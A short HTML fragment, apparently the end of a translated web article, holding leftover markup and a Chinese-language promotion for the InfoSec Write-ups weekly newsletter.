pn po pp"/><span class="pm bw bk pn po pp"/><span class="pm bw bk pn po"/></div><div class="in io ip iq ir"><h2 id="2892" class="nc lh iu bd li nd ne dn lm nf ng dp lq kc nh ni lu kg nj nk ly kk nl nm mc nn bi translated">来自Infosec的报道:Infosec每天都有很多内容，很难跟上。<a class="ae kp" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank">加入我们的每周简讯</a>以5篇文章、4个线程、3个视频、2个GitHub Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</h2></div></div>    
</body>
</html>